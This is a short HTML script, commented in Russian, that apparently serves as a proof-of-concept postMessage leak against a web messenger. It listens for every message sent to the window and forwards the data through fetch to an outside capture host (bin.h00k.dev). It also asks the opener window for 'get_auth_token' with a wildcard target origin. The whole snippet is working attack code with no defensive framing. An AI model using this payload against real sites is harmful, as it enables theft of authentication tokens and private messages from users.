<script>
    // Слушаем все сообщения, которые мессенджер может слать в открытые окна
    window.addEventListener("message", function(event) {
        fetch('https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4?postmessage_leak=' + JSON.stringify(event.data));
    }, false);

    // Пытаемся спровоцировать мессенджер прислать нам что-то
    if (window.opener) {
        window.opener.postMessage("get_auth_token", "*"); 
    }
</script>
